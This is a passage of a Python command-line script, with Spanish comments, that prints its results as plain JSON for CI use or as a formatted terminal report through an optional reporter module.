    # Modo JSON puro (para CI/automatización): NO imprimir reporter
    if args.json:
        print(json.dumps(results, indent=4))
        return

    # Modo bonito (por defecto): usar reporter
    if _HAS_REPORTER:
        reporter = TerminalReporter(
            use_color=None if not args.no_color else False
        )
        reporter.print_report(
            results,
            output_path=args.output,
            elapsed=elapsed,
        )
    else:
        # Fallback si reporter.py no está disponible
        print(json.dumps(results, indent=4))


if __name__ == "__main__":
    main()